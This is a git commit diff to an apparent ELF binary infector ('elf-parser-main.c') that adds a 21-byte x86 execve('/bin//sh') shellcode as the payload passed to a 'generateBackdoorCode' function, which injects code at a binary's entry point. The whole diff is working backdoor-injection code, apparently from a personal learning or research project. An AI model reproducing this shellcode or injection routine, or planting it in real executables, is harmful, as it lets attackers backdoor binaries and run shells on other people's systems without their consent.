257c284a62e992b458a7027479fb1d8e6cbc5890
Niv <dindibo4@gmail.com>
2020-12-04 03:13:00 +0200

    Added simple execve 21 byte shellcoed

--- elf-parser-main.c
+++ elf-parser-main.c
@@ -451,7 +451,9 @@ int32_t main(int32_t argc, char *argv[])
 		int newEntryPointSize;
 		littleEndianToBigEndian(oldAddr, 4);
 
-		char *malEntryPointCode = generateBackdoorCode(oldAddr, "\x90\x90\x90\x90\xcc", 5, &newEntryPointSize);
+		char *payload = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
+
+		char *malEntryPointCode = generateBackdoorCode(oldAddr, payload, strlen(payload), &newEntryPointSize);
 
 		if(newEntryPointSize > winner->length) {
 			puts("Code injection isn't possible!");
